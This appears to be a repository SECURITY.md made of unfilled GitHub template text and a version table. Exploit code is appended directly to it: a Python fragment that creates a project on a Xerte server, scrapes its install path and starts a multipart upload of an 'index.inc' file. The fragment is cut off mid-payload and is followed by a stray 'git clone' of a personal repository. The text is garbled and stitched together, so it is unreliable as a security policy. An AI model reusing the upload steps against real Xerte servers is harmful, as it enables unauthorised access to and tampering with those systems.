# Security Policy

## Supported Versions

Use this section to tell people about which versions of your project are
currently being supported with security updates.

| Version | Supported          |
| ------- | ------------------ |
| 5.1.x   | :white_check_mark: |
| 5.0.x   | :x:                |
| 4.0.x   | :white_check_mark: |
| < 4.0   | :x:                |

## Reporting a Vulnerability

Use this section to tell people how to report a vulnerability.

Tell them where to go, how often they can expect to get an update on a
reported vulnerability, what to expect if the vulnerability is accepted or
declined, etc.
 # Use a default template
data = {
    'tutorialid': 'Nottingham',
    'templatename': 'Nottingham',
    'tutorialname': 'exploit',
    'folder_id': ''
}

# Create a new project in order to find the install path
template_id = session.post(xerte_base_url + '/website_code/php/templates/new_template.php', data=data)

# Find template ID
data = {
    'template_id': re.findall('(\d+)', template_id.text)[0]
}

# Find the install path:
install_path = session.post(xerte_base_url + '/website_code/php/properties/media_and_quota_template.php', data=data)
install_path = re.findall('mediapath" value="(.+?)"', install_path.text)[0]

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'nl,en-US;q=0.7,en;q=0.3',
    'Content-Type': 'multipart/form-data; boundary=---------------------------170331411929658976061651588978',
   }

# index.inc file
data = \
'''-----------------------------170331411929658976061651588978 
git clone https://github.com/cr0ss2018/cr0ss2018
